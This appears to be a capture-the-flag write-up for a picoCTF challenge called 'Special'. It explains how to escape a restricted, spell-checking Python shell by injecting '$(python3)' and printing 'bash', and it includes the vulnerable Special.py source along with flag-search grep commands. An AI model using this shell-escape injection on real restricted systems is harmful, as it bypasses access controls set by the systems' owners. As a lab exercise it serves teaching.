# Special overview

Highly restricted shell and we need to break it.

## The problem

Try some random input or basic commands then we will find our output got changed in some weird ways.

```bash
Special$ pwd
Pod
sh: 1: Pod: not found
Special$ ls
Is
sh: 1: Is: not found
```

You can't run `sh` or `bash` too.

```bash
Special$ sh
Why go back to an inferior shell?
```

Also, when you press Ctrl+C you will see this.

```bash
Special$ ^CTraceback (most recent call last):
  File "/usr/local/Special.py", line 11, in <module>
    cmd = input("Special$ ")
KeyboardInterrupt
Connection to saturn.picoctf.net closed.
```

This hints us about the we are inside a Python script as shell.

(In post-inspection after breaking the question, inside the `/etc/passwd`, we have our shell defined as `ctf-player:x:1000:1000::/home/ctf-player:/usr/local/Special.py`)

I am lucky to try some injection-like input to break out of this script... (Get the idea from the question VNE)

```bash
Special$ $(python3)  # This is our input
# Yes!!

$(python3)  # This is printed by the script
Python 3.8.10 (default, Nov 14 2022, 12:59:47)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> ls
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'ls' is not defined
>>> print("monkaS")
>>> exit()
sh: 1: monkaS: not found
```

So it tries to run `monkaS` - we find a way to jailbreak the script by manipulating the standard output! `print()`

## Solution

```bash
Special$ $(python3)
$(python3)

print("bash")
exit()
ctf-player@challenge:~$
```

We have the old shell now. Get the flag by `grep -Po picoCTF{.*?} /challenge/metadata.json` (Actually it is inside our home directory)

`$ grep -Pro picoCTF{.*?} / 2>/dev/null` if you just try to look for anything when you have a shell.

## More about the script

Here is the script (`Special.py`).

```python
#!/usr/bin/python3

import os
from spellchecker import SpellChecker

spell = SpellChecker()

while True:
  cmd = input("Special$ ")
  rval = 0

  if cmd == 'exit':
    break
  elif 'sh' in cmd:
    print('Why go back to an inferior shell?')
    continue
  elif cmd[0] == '/':
    print('Absolutely not paths like that, please!')
    continue

  # Spellcheck
  spellcheck_cmd = ''
  for word in cmd.split():
    fixed_word = spell.correction(word)
    if fixed_word is None:
      fixed_word = word
    spellcheck_cmd += fixed_word + ' '

  # Capitalize
  fixed_cmd = list(spellcheck_cmd)
  words = spellcheck_cmd.split()
  first_word = words[0]
  first_letter = first_word[0]
  if ord(first_letter) >= 97 and ord(first_letter) <= 122:
    fixed_cmd[0] = chr(ord(spellcheck_cmd[0]) - 0x20)
  fixed_cmd = ''.join(fixed_cmd)

  try:
    print(fixed_cmd)
    os.system(fixed_cmd)
  except:
    print("Bad command!")

```

Now we can read the script after breaking it. Probably the best way is not to use any commands with English letters at all...(Yes, this is possible)

My solution was lucky enough to dodge the bullet of "first letter capitalization" with `$`. And the word `python` is a valid word so it remains unchanged.
